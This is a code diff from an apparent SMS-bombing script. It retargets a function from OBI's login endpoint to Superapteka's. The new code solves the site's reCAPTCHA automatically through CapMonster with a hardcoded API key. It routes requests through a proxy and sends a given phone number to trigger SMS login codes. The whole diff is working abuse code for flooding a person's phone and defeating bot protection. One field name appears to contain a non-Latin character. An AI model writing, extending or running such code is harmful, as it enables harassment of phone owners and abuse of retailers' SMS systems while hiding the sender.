@@ -1,21 +1,26 @@
 import requests
 from config import Proxy, Services
 import json
+from capmonster_python import RecaptchaV2Task
 
 
-def send_sms_to_obi(phone_number: str):
+def send_sms_to_superapteka(phone_number: str):
     try:
-        url = Services.OBI
+        url = Services.SUPERAPTEKA
+
         headers = {
             "Content-Type": "application/json",
             "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36"
         }
 
+        capmonster = RecaptchaV2Task("2b34ab1ed18543953dd6c4751bebd58e")
+        task_id = capmonster.create_task("https://superapteka.ru/", "6LfuiY8aAAAAAHlIASGG4el8o7Y2zUEjnIXX7bkb")
+        result = capmonster.join_task_result(task_id)
+        capcha = result.get("gRecaptchaResponse")
+
         data = {
-            "query": "mutation($phone_1:String!){startLogin(phone:$phone_1){exists,error{type}}}",
-            "variables": {
-                "phone_1": phone_number[1::1]
-            }
+            "phоne": phone_number,
+            "g-recaptcha-response": capcha
         }
 
         proxies = {
@@ -23,12 +28,9 @@ def send_sms_to_obi(phone_number: str):
             "https": Proxy.PROXY_URL
         }
 
-        session = requests.session()
-        cooki = session.get('https://obi.ru')
-        session.cookies.update(cooki.cookies)
-        response = session.post(url, headers=headers, proxies=proxies, json=data)
-        print("OBI: ", response, response.text)
-        with open('logs\\obi.log', "w") as file:
+        response = requests.post(url, headers=headers, json=data, proxies=proxies)
+        print("SUPERAPTEKA: ", response, response.text)
+        with open('logs\\superapteka.log', "w") as file:
             file.write(f"Статус код: {str(response.status_code)}\nОтвет: {response.text}")
         response.raise_for_status()
         try:
